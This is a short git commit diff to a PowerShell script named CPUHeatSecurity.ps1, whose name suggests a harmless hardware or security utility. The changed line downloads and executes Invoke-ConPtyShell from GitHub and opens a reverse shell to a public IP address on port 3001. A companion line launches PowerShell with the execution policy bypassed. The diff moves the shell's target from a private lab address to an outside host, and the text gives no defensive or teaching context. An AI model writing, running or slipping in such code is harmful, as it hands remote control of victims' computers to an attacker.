e25eec60109b02b4db6f4b3f6796a761ea2032c7
Gamoboy <108472792+Gamoboy@users.noreply.github.com>
2023-06-09 13:49:16 +0400

    Update CPUHeatSecurity.ps1

--- CPUHeatSecurity.ps1
+++ CPUHeatSecurity.ps1
@@ -1,4 +1,4 @@
-$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001"
+$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 77.143.4.164 3001"
 
 $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$command`""
 
